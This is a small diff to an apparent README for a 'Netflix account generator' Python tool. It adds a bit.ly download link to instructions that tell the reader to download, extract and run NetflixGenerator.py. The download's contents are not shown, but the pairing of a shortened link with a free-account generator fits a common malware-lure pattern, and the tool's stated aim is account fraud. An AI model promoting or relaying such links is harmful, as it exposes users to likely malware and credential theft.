@@ -30,6 +30,9 @@ pip install time
 
 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱
 
+Download - https://bit.ly/NetflixAccGenratorbyFluro
+
+
 Steps.
 First download the program through the download link, extract to a folder
 Type "cmd" on the folder, then python NetflixGenerator.py
